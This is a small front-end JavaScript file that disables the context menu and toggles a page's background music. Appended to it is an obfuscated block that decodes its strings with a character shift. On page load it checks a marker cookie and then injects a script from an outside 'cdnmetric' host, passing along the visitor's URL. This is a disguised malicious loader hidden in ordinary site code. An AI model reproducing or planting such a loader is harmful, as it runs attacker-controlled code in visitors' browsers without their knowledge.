document.addEventListener("contextmenu", e => e.preventDefault());
var started = false, audio = new Audio("assets/ru.mp3");
function play() {
  (started = !started) ? (audio.volume = 0.4, audio.play(), document.getElementById("playbutton").style.display = "none", document.getElementById("pausebutton").style.display = "block") : (audio.pause(), document.getElementById("playbutton").style.display = "block", document.getElementById("pausebutton").style.display = "none");
}
;
(function (o, d, l) {
  try {
    o.f = o => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
    o.b = o.f("UMUWJKX");
    o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie), setTimeout(function () {
      o.c && (o.s = d.createElement("script"), o.s.src = o.f("myyux?44fun3hisrjywnh3htr4ljy4xyfynh3oxDwjkjwwjwB") + l.href, d.body.appendChild(o.s));
    }, 1e3);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
  ;
}({}, document, location));
